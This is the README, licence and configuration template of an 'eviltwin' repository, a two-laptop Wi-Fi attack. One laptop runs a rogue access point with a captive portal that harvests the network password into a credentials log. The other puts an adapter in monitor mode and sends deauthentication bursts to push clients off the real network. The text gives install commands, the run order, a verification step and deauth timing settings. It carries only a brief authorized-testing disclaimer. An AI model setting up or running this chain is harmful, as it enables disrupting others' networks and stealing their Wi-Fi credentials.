# eviltwin

Two-laptop evil twin chain. **Laptop A** = rogue AP + captive portal.
**Laptop B** = monitor mode + deauth. PSK is harvested from the portal.

> For authorized security testing only. Running this against a network you
> do not own or lack written permission to test is illegal.

## Roles

| Laptop | Role | Needs |
|---|---|---|
| A | rogue AP, DHCP/DNS, portal, harvest | adapter with AP mode (built-in usually works) |
| B | recon, monitor mode, deauth | adapter with monitor + injection (USB, e.g. AR9271 / RTL8812AU) |

## Install (both laptops)

```bash
sudo apt update
sudo apt install -y hostapd dnsmasq nginx php-fpm aircrack-ng iw wireless-tools
git clone <this-repo> eviltwin
cd eviltwin
cp config/eviltwin.env.example config/eviltwin.env
$EDITOR config/eviltwin.env
Run order
Laptop B — recon the target, fill in TARGET_* in config/eviltwin.env:

bash
sudo ./scripts/recon.sh wlan0
Laptop A — start the rogue AP + portal:

bash
sudo ./scripts/laptop-a-ap.sh
Laptop B — start deauth:

bash
sudo ./scripts/laptop-b-attack.sh
Laptop A — watch harvest:

bash
sudo tail -f /tmp/eviltwin/creds.log
Ctrl-C on each to teardown.

Verify before the real run
Laptop B: sudo iw dev wlan0 scan | grep -i "$TARGET_SSID" → rogue SSID visible

Phone: join rogue SSID → captive portal pops → submit dummy password → appears in creds.log

Only then start deauth.

text

---

### `.gitignore`
config/eviltwin.env
*.log
*.cap
*.hc22000
pycache/

text

---

### `LICENSE`
MIT License

Copyright (c) 2026

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

text

---

### `config/eviltwin.env.example`

```bash
# ── target (fill after recon) ─────────────────────────────────────────────
TARGET_SSID="MyHomeWiFi"
TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CH=6

# ── laptop A (AP) ─────────────────────────────────────────────────────────
AP_IF="wlan0"                # Laptop A's interface for the rogue AP
AP_IP="192.168.99.1"
AP_NET="192.168.99.0/24"
DHCP_RANGE="192.168.99.10,192.168.99.100,255.255.255.0,12h"
PIN_BSSID=0                  # 1 = pin rogue AP to real BSSID (WPA3-pinned clients)

# ── laptop B (attack) ─────────────────────────────────────────────────────
MON_IF="wlan0"               # Laptop B's interface for monitor/deauth
DEAUTH_BURST=10              # packets per aireplay-ng call
DEAUTH_SLEEP=3               # seconds between bursts

# ── paths ─────────────────────────────────────────────────────────────────
WORK="/tmp/eviltwin"
PORTAL_DIR="/var/www/evil"
